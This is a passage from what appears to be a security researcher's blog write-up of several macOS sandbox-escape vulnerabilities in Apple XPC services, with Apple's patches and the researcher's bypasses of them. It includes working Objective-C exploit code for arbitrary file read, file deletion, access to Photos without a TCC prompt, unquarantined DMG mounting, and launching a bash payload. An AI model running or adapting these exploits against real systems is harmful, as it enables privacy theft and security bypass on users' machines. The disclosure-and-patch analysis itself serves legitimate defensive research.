<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150711811.png" alt="image-20241020150711811"/></p>

<p>Internally, it calls the API <code>sandbox_extension_issue_file</code> to issue the file access token.</p>

<p>The arbitrary URL is specified from the sandboxed XPC client.</p>

<h3 id="the-exploit-and-demo-4">The exploit and demo</h3>

<div><div><pre><code>@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@&#34;/System/Library/PrivateFrameworks/WorkflowKit.framework&#34;]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.WorkflowKit.ShortcutsFileAccessHelper&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass(&#34;FPSandboxingURLWrapper&#34;)]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen(&#34;/usr/lib/system/libsystem_sandbox.dylib&#34;, 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, &#34;sandbox_extension_consume&#34;);
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@&#34;Fail to consume the sandbox token:%@&#34;, sbxToken);
        else {
            NSLog(@&#34;Got the file R&amp;W permission with sandbox token:%@&#34;, sbxToken);
            NSLog(@&#34;Read the target content:%@&#34;, [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/5FVDe8Le1pw</p>

<h3 id="the-patch-4">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “<strong>com.apple.shortcuts.file-access-helper</strong>” from the incoming XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151017457.png" alt="image-20241020151017457"/></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-41077">CVE-2023-41077</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172822557.png" alt="image-20241019172822557"/></p>

<h3 id="the-issue-5">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/Frameworks/ImageCaptureCore.framework/XPCServices/mscamerad-xpc.xpc
</code></pre></div></div>

<p>Similarly, the XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>What’s more, it has the special TCC entitlement in its code signature to access the <strong>Photos</strong> and <strong>Removable Volumes</strong> directly without prompting the users:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151150288.png" alt="image-20241020151150288"/></p>

<p>Therefore, it can also be exploited to bypass these TCC protections at the same time!</p>

<p>The main logic is to listen at the service named “<strong>com.apple.mscamerad-xpc</strong>”.</p>

<p>Similarly, this XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151313353.png" alt="image-20241020151313353"/></p>

<p>The <code>ICXPCDeviceManagerProtocol</code> has six methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151341184.png" alt="image-20241020151341184"/></p>

<p>Specially, the XPC method “<code>openDevice:withReply:</code>” is designed to open and construct a new <code>MSCameraDevice</code>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151437728.png" alt="image-20241020151437728"/></p>

<p>During the initialization of the new device, it listens at another anonymous XPC service to provide some service routines for the new camera device:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151501301.png" alt="image-20241020151501301"/></p>

<p>The anonymous XPC service accepts all the incoming XPC clients by returning YES in the camera device’s delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151531992.png" alt="image-20241020151531992"/></p>

<p>The <code>ICCameraDeviceProtocol</code> has 23 methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151608007.png" alt="image-20241020151608007"/></p>

<p>The issue exists in the XPC method “<code>requestReadDataFromObjectHandle:options:withReply:</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151651506.png" alt="image-20241020151651506"/></p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151705732.png" alt="image-20241020151705732"/></p>

<p>It reads the file content for the requested file item and replies the file content data to the XPC client. The requested file path is controlled from the XPC client. So a sandboxed application can exploit this XPC method to read an arbitrary file outside of the sandbox container.</p>

<p>At the same time, the sandboxed app can also read the user’s <strong>Photos</strong> directly without prompting the users due to the service’s powerful TCC entitlements.</p>

<h3 id="the-exploit-and-demo-5">The exploit and demo</h3>

<p>In order to trigger the vulnerability, we need to prepare the camera device and the camera file.</p>

<p>Through my research, I discovered that the <strong>MSCameraDevice</strong> can be emulated by creating a DMG file and mounting it.</p>

<p>Next, if a file path in the DMG volume matches the special <strong>regular expression</strong>, then the file item will be indexed as an <strong>ICCameraFile</strong> and the file data can be requested via the vulnerable XPC method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152029416.png" alt="image-20241020152029416"/></p>

<div><div><pre><code>folderNameRegex = [NSRegularExpression regularExpressionWithPattern:@&#34;^([1-9]{1}[\\d]{2}[\\w]{5})$|^((?i)\\bDCIM\\b)$&#34; options:16 error:0];// e.g. 123abcde, DCIM, dcIm, ...
fileNameRegex = [NSRegularExpression regularExpressionWithPattern:@&#34;^[\\w]{4}(E){0,1}(\\d){4}\\.(([\\w]){3}|HEIC)$&#34; options:16 error:0];// e.g. abcd1234.mp3, 1234E5678.HEIC
</code></pre></div></div>

<p>So we can make a fake camera device and camera file like this:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152230512.png" alt="image-20241020152230512"/></p>

<p>A sandboxed application could drop the DMG file and then open the DMG file to mount it to trigger the issue.</p>

<p>The XPC client has already been implemented in the ImageCaptureCore framework. The exploit code is as follows:</p>

<div><div><pre><code>@interface MyDeviceDelegate : NSObject&lt;ICCameraDeviceDelegate&gt;
@end
@implementation MyDeviceDelegate
- (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray&lt;ICCameraItem *&gt; *)items { 
    NSLog(@&#34;didAddItems&#34;);
    for (ICCameraFile *item in items) {
        NSLog(@&#34;new file item:%@&#34;, item); // TODO: I should check the item type(file/folder) and item name here.
        [item requestReadDataAtOffset:0 length:item.fileSize completion:^(NSData *data, NSError *err) {
            NSLog(@&#34;Got file data:%@ (%@)&#34;, data, [NSString stringWithCString:[data bytes] encoding:NSUTF8StringEncoding]);
        }];
    }
}
@end
@interface MyDeviceBrowserDelegate : NSObject&lt;ICDeviceBrowserDelegate&gt;
@end
@implementation MyDeviceBrowserDelegate
- (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing { 
    NSLog(@&#34;didAddDevice:%@&#34;, device);
    device.delegate = devDelegate; // instance of MyDeviceDelegate
    [device requestOpenSession];
}
@end
void exploit(void) {
    ICDeviceBrowser *deviceBrowser = [[ICDeviceBrowser alloc]init];
    MyDeviceBrowserDelegate *browserDelegate = [[MyDeviceBrowserDelegate alloc]init];
    deviceBrowser.delegate = browserDelegate;
    [deviceBrowser start];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/bvJwne8b2g4</p>

<h3 id="the-patch-1">The patch 1</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14 by adding a new check in the function <code>acceptConnection:</code>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152404523.png" alt="image-20241020152404523"/></p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152412462.png" alt="image-20241020152412462"/></p>

<p>The check function returns <strong>OK</strong> if the incoming XPC client meets one of the following <strong>two conditions</strong>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152502353.png" alt="image-20241020152502353"/></p>

<ul>
  <li>Return OK if the client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</li>
  <li>Return OK <strong>if the client is a platform binary!</strong></li>
</ul>

<h3 id="the-bypass-1">The bypass 1</h3>

<p>The second condition doesn’t make any sense because the <strong>platform binary</strong> is not trustworthy and <strong>easy to inject</strong>! Then I reported the new issue to Apple. As a result, Apple assigned <strong>CVE-2024-23253</strong> to this bypass report:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152721547.png" alt="image-20241020152721547"/></p>

<p>Here’s how I bypassed the patch to access the TCC-protected contents:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li>Talk to the XPC service as before</li>
</ol>

<h3 id="the-patch-2">The patch 2</h3>

<p>Apple patched the issue again in macOS 14.4 by hardening the second condition:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153333113.png" alt="image-20241020153333113"/></p>

<table>
  <tbody>
    <tr>
      <td>From the new patch code, we can see that it requires the XPC client to not only be the <strong>platform binary</strong>, but also to be signed with the flags: “**CS_REQUIRE_LV</td>
      <td>CS_FORCED_LV**”.</td>
    </tr>
  </tbody>
</table>

<h3 id="the-bypass-2">The bypass 2</h3>

<p>Apple thought that the new required flags would kill the dynamic library injection exploits. But they were wrong. The checks here can still be bypassed! Again, I reported the new bypass to Apple and they assigned the new CVE-2024-40831 for it:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153456843.png" alt="image-20241020153456843"/></p>

<p>Here’s how I exploited it again:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li><strong>Set the required flags manually</strong></li>
  <li>Talk to the XPC service as before</li>
</ol>

<p>Compared to the previous exploit, only one additional step has been added. After injecting into the platform binary “<code>ls</code>” command, the exploit process doesn’t have the required flags. However, the desired flags can be set manually at runtime via the system API “<code>csops</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153657853.png" alt="image-20241020153657853"/></p>

<p>As a result, the exploit process will bypass all the checks and talk to the XPC service as before!</p>

<h3 id="the-patch-3">The patch 3</h3>

<p>Apple patched this issue again in macOS Sequoia 15:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153742037.png" alt="image-20241020153742037"/></p>

<p>Now, It will approve the XPC connection, only if the XPC client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</p>

<h2 id="cve-2023-42961">CVE-2023-42961</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172851367.png" alt="image-20241019172851367"/></p>

<p>Note that this vulnerability can also be exploited on <strong>iOS</strong>.</p>

<h3 id="the-issue-6">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/Frameworks/Intents.framework/XPCServices/intents_helper.xpc
</code></pre></div></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153831152.png" alt="image-20241020153831152"/></p>

<p>The <code>INHServing</code> protocol has 11 methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153859143.png" alt="image-20241020153859143"/></p>

<p>There is a path traversal issue in the function named “<code>filePathForImageWithFileName</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154451538.png" alt="image-20241020154451538"/></p>

<p>The function parameter <code>fileName</code> is an arbitrary string, that can be controlled by the XPC client.</p>

<p>This vulnerable function can be reached from two XPC methods:</p>

<p>The first XPC method is named “<code>retrieveImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154537678.png" alt="image-20241020154537678"/></p>

<p>It can be abused to read an arbitrary file with extension “<code>.png</code>”, and the retrieved data will be stored in a member variable of the “<code>INImage</code>” instance and replied to the XPC client.</p>

<p>The second XPC method is named “<code>purgeImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154636438.png" alt="image-20241020154636438"/></p>

<p>It can be exploited to delete an arbitrary file path.</p>

<h3 id="the-exploit-and-demo-6">The exploit and demo</h3>

<div><div><pre><code>@protocol INHServing
- (oneway void)purgeImageWithIdentifier:(NSString *)arg1 completion:(void (^)(NSError *))arg2;
- (oneway void)retrieveImageWithIdentifier:(NSString *)arg1 completion:(void (^)(INImage *, NSError *))arg2;
@end

void exploit_intents_helper(NSString *target) {
    [[NSBundle bundleWithPath:@&#34;/System/Library/Frameworks/Intents.framework&#34;]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.intents.intents-helper&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(INHServing)];
    [conn setInterruptionHandler:^{
        NSLog(@&#34;connection interrupted!&#34;);
    }];
    [conn setInvalidationHandler:^{
        NSLog(@&#34;connection invalidated!&#34;);
    }];
    [conn resume];

    [[conn remoteObjectProxy] purgeImageWithIdentifier:[@&#34;../../../../..&#34; stringByAppendingPathComponent:target] completion:^(NSError *error) {
        NSLog(@&#34;error:%@&#34;, error);
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/X0fv3x6bmF8</p>

<h3 id="the-patch-5">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the input string from the XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154748729.png" alt="image-20241020154748729"/></p>

<p>The special characters used for path traversal will be trimmed.</p>

<h2 id="cve-2024-27864">CVE-2024-27864</h2>

<p>The CVE entry is waiting to be published.</p>

<h3 id="the-issue-7">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/DiskImages2.framework/XPCServices/diskimagescontroller.xpc
</code></pre></div></div>

<p>This XPC service is powerful because it has the special entitlement “<strong>com.apple.diskimages.creator-uc</strong>” in its code signature:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155146714.png" alt="image-20241020155146714"/></p>

<p>This entitlement has two main functions:</p>

<ul>
  <li>Talk to <code>/usr/libexec/diskimagesiod</code>, which has the <strong>FDA</strong> entitlement and does the real attach job.</li>
  <li>Connect to the IOKit Service “<strong>AppleDiskImagesController</strong>” (<code>/System/Library/Extensions/AppleDiskImages2.kext</code>), which <strong>creates</strong> and <strong>quarantines</strong> a device for a DMG file.</li>
</ul>

<p>Similarly, the XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155625758.png" alt="image-20241020155625758"/></p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155632557.png" alt="image-20241020155632557"/></p>

<p>The <code>DIControllerProtocol</code> has 10 methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155720932.png" alt="image-20241020155720932"/></p>

<p>The first issue exists in the XPC method named “<code>attachWithParams:reply:</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155804040.png" alt="image-20241020155804040"/></p>

<p>At line 12, it calls the function “<code>checkAttachEntitlementWithError</code>”. As the name implies, the checker function should check the entitlement of the incoming XPC client. However, it always returns <strong>TRUE</strong>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155850857.png" alt="image-20241020155850857"/></p>

<p>The XPC client has already been implemented in the <code>DiskImages2.framework</code> as the objective-c class <strong>DIAttachParams</strong>. And the XPC connection can be established via the method “<code>-[DIAttachParams newAttachWithError:]</code>”. So I could reuse the framework code directly like this to attach a DMG volume without reinventing the wheels:</p>

<div><div><pre><code>NSError *error=nil;
DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@&#34;quarantined_payload.dmg&#34;] error:&amp;error];
[params newAttachWithError:&amp;error];
</code></pre></div></div>

<p>However, I discovered that the <strong>client code</strong> in the framework will <strong>check</strong> whether the input URL is quarantined:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020160238432.png" alt="image-20241020160238432"/></p>

<p>If the input URL is quarantined, it will set the <strong>quarantine parameter</strong> before invoking the XPC method to attach. This will notify the XPC service to quarantine the target device.</p>

<p>So in my own XPC client, I can <strong>skip the quarantine parameter setting</strong> and invoke the XPC method to attach directly. As a result, the XPC service will <strong>attach a quarantined DMG file without quarantining the corresponding device</strong>.</p>

<h3 id="the-exploit-and-demo-7">The exploit and demo</h3>

<p>In order to skip setting the quarantine parameter, I have to <strong>rewrite the XPC client code</strong> by myself:</p>

<div><div><pre><code>@protocol DIControllerProtocol
- (void)dupWithStderrHandle:(NSFileHandle *)arg1 reply:(void (^)(NSError *))arg2;
- (void)attachWithParams:(DIAttachParams *)arg1 reply:(void (^)(NSError *))reply;
@end
@interface DIController2Client : NSObject&lt;DIController2ClientProtocol&gt;
@end
@implementation DIController2Client
- (void)attachCompletedWithHandle:(NSFileHandle *)handle reply:(void (^)(NSError *))reply {
    NSLog(@&#34;attachCompletedWithHandle:%@&#34;, handle);
    system(&#34;open /Volumes/.exploit/poc.app&#34;); // launch the app from the payload.dmg (unquarantined mounting)
    reply(0);
}
@end
void exploit_diskimages2(void) {
    [[NSBundle bundleWithPath:@&#34;/System/Library/PrivateFrameworks/DiskImages2.framework&#34;] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.diskimagescontroller&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIControllerProtocol)];
    conn.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIController2ClientProtocol)];
    conn.exportedObject = [[DIController2Client alloc]init];
    [conn resume];
    id proxy = [conn remoteObjectProxy];
    
    // [proxy dupWithStderrHandle:[NSFileHandle fileHandleWithStandardError] reply:^(NSError *err) {}];
    DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@&#34;payload.dmg&#34;] error:nil];
    [proxy attachWithParams:params reply:^(NSError *err) { // the quarantined payload.dmg (dropped by this sandboxed app) will be attached without being quarantined!
        NSLog(@&#34;attach error:%@&#34;, err);
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/FYcFwkgiGzw</p>

<h3 id="the-patch-6">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.4 by <strong>moving the verification logic from the client side to the server side</strong>.</p>

<p>It will quarantine the corresponding device directly from the server, if the input file path is quarantined.</p>

<h2 id="cve-2023-42977">CVE-2023-42977</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173015038.png" alt="image-20241019173015038"/></p>

<h3 id="the-issue-8">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/PowerlogCore.framework/XPCServices/PerfPowerServicesSignpostReader.xpc
</code></pre></div></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162727212.png" alt="image-20241020162727212"/></p>

<p>The <code>XPCSignpostReaderProtocol</code> has 6 methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162915916.png" alt="image-20241020162915916"/></p>

<p>However, Apple has only implemented one XPC method named “<code>submitSignpostDataWithConfig:withReply:</code>”, the other 5 XPC methods are empty implementations.</p>

<p>The core logic of this XPC method is to collect the log data and archive it to a gzip file. It seems that the log archive data will later be submitted to the Apple servers. However, there is a path traversal issue in this XPC method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163019774.png" alt="image-20241020163019774"/></p>

<p>Because the variable “<code>tagUUID</code>” is an arbitrary string, that can be controlled by the XPC client. The “<code>powerlog</code>” path can be hijacked to an arbitrary path.</p>

<h3 id="the-exploit-and-demo-8">The exploit and demo</h3>

<h4 id="the-exploit-1-arbitrary-path-delete">The Exploit 1: Arbitrary Path Delete</h4>

<p>At line 160 of the function:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163201932.png" alt="image-20241020163201932"/></p>

<p>It calls the method named “<code>archiveDirectoryAt:deleteOriginal:</code>” which will delete the “<code>powerlog</code>” path. So this gives the attacker a primitive to remove an arbitrary path:</p>

<div><div><pre><code>    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @&#34;taskingAllowlist&#34;:@{},
        @&#34;taskingStartDate&#34;:[NSDate now],
        @&#34;taskingEndDate&#34;:[NSDate now],
        @&#34;taskingSubmitSP&#34;:@0,
        @&#34;taskingTagConfig&#34;:@{
            @&#34;TagUUID&#34;:[NSString stringWithFormat:@&#34;/../../../../../%@&#34;, path]
        }
    } withReply:^(id reply) {
        NSLog(@&#34;reply:%@&#34;, reply);
    }];
</code></pre></div></div>

<h4 id="the-exploit-2-arbitrary-directory-create-and-full-sandbox-esacpe">The Exploit 2: Arbitrary Directory Create and Full Sandbox Esacpe</h4>

<p>Moreover, at line 41 of the function “<code>createSignpostFile:</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163334261.png" alt="image-20241020163334261"/></p>

<p>It creates the directory at the “<code>powerlog</code>” path. So this gives the attacker a primitive to create an arbitrary directory:</p>

<div><div><pre><code>@protocol XPCSignpostReaderProtocol &lt;NSObject&gt;
- (void) submitSignpostDataWithConfig:(id)config withReply:(void (^)(id))arg2;
@end
void my_create_path(NSString *path) {
    [[NSBundle bundleWithPath:@&#34;/System/Library/PrivateFrameworks/PowerlogCore.framework&#34;]load];
    conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.PerfPowerServicesSignpostReader&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCSignpostReaderProtocol)];
    [conn resume];
    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @“taskingAllowlist&#34;:@{}, @&#34;taskingStartDate&#34;:[NSDate now], @&#34;taskingEndDate&#34;:[NSDate now], @“taskingSubmitSP&#34;:@1,
        @&#34;taskingTagConfig&#34;:@{
            @&#34;TagUUID&#34;:[NSString stringWithFormat:@&#34;/../../../../../%@/logarchive&#34;, path],
            …
        }
    } withReply:^(id reply) {
        NSLog(@&#34;reply:%@&#34;, reply);
    }];
}
</code></pre></div></div>

<p>In fact, <strong>the primitive to create an arbitrary directory without the quarantine extended attribute can lead to a full sandbox escape</strong>.</p>

<p>Here, I used the trick from <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>:</p>

<div><div><pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *currentDir = NSHomeDirectory();
    NSString *payloadPath = [currentDir stringByAppendingPathComponent:@&#34;payload&#34;];
    [@&#34;#!/bin/bash\ntouch /tmp/sbx\n&#34; writeToFile:payloadPath atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
    NSString *myapp = [currentDir stringByAppendingPathComponent:@&#34;poc.app&#34;];
    my_create_path(myapp); // create .app folder without being quarantined
    
    mkdir(&#34;poc.app/Contents&#34;, 0777);
    mkdir(&#34;poc.app/Contents/MacOS&#34;, 0777);
    symlink(&#34;/bin/bash&#34;, &#34;poc.app/Contents/MacOS/poc&#34;);
    NSString *cmd = [NSString stringWithFormat:@&#34;defaults write \&#34;%@/poc.app/Contents/Info\&#34; LSEnvironment -dict-add BASH_ENV \&#34;%@\&#34;&#34;, currentDir, payloadPath];
    system([cmd UTF8String]);
    system(&#34;open ./poc.app&#34;);
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/6R4tfOGAjm0</p>

<h3 id="the-patch-7">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by <strong>sanitizing the UUID string</strong> from the XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164330021.png" alt="image-20241020164330021"/></p>

<p>If the input string is not a <strong>valid UUID</strong>, then it will exit the function.</p>



<h3 id="summary">Summary</h3>

<ul>
  <li>
    <p>An overlooked attack surface</p>
  </li>
  <li>
    <ul>
      <li>System (private) frameworks’ XPC services (<strong>PID Domain</strong>)</li>
    </ul>
  </li>
  <li>
    <p>Drop a file/folder without being quarantined == Full Sandbox Escape</p>
  </li>
  <li>
    <ul>
      <li>File quarantine attribute lost during decompression == <strong>Gatekeeper Bypass</strong> == <strong>Sandbox Escape</strong>. E.g., <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a></li>
    </ul>
  </li>
  <li>
    <p>A few sandbox escape vulnerabilities and the exploits</p>
  </li>
  <li>
    <ul>
      <li>
        <p>And more?</p>
      </li>
      <li>
        <ul>
          <li>There are 5 reports still in the patching queue</li>
          <li>Find your own sandbox escape vulnerabilities :P</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="one-more-thing">One More Thing</h3>

<p>I submitted this report to Apple:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164839630.png" alt="image-20241020164839630"/></p>

<p>Apple deemed it an expected behavior and closed the report:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164854324.png" alt="image-20241020164854324"/></p>

<p>I can understand why Apple thinks this is an expected behavior. Because the newly launched application is not in the context of the current process and it cannot share entitlements or privileges that the current process may have.</p>

<h3 id="my-thoughts">My thoughts</h3>

<ul>
  <li>The <strong>App Sandbox</strong>: dropped files are quarantined <strong>by default</strong>.</li>
  <li>The <strong>Service Sandbox</strong>: dropped files are <strong>not quarantined by default.</strong></li>
  <li>
    <ul>
      <li>
        <ul>
          <li>Not a flaw: The newly launched process is <strong>not in the current service execution context</strong>, and thus can’t share the entitlements/privileges of the current service.</li>
          <li>It’s a flaw: Once an attacker get the remote code execution (RCE) in a sandbox-restricted service context (e.g., <strong>IMTranscoderAgent, 0-click exploited by NSO Group</strong>), he can drop and launch a new non-sandboxed application to get rid of the sandbox restriction of the target service (<strong>IMTranscoderAgent</strong>).</li>
          <li>e.g., “<code>com.apple.WebDriver.HTTPService.xpc</code>” calls the API “<strong>WBSEnableSandboxStyleFileQuarantine</strong>” manually.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Escape from the <strong>App Sandbox</strong> to the <strong>Service Sandbox</strong> == <strong>Non Sandbox</strong> (<strong>macOS Only</strong>)</li>
</ul>

<h3 id="resources">Resources</h3>

<p>Here is a list of resources for reference:</p>

<ul>
  <li>https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</li>
  <li>https://saelo.github.io/presentations/bits_of_launchd.pdf</li>
  <li>https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html</li>
  <li>https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</li>
